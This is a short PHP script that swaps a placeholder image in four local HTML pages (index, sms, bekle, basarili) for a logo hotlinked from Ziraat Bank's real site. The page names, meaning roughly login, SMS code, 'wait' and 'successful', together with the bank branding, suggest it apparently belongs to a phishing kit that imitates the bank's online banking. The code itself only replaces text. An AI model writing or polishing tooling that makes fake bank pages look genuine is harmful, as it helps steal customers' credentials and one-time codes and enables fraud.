<?php
$files = ['c:\\xampp\\htdocs\\index.html', 'c:\\xampp\\htdocs\\sms.html', 'c:\\xampp\\htdocs\\bekle.html', 'c:\\xampp\\htdocs\\basarili.html'];
foreach ($files as $file) {
    if (file_exists($file)) {
        $content = file_get_contents($file);
        $content = str_replace('<img src="Gemini_Generated_Image_mzavmwmzavmwmzav.png" style="display:block; margin: 0 auto; max-width: 200px; padding: 20px;">', '<img src="https://bireysel.ziraatbank.com.tr/Content/assets/img/ziraat_logo.png" style="display:block; margin: 0 auto; max-width: 200px; padding: 20px;">', $content);
        file_put_contents($file, $content);
    }
}
?>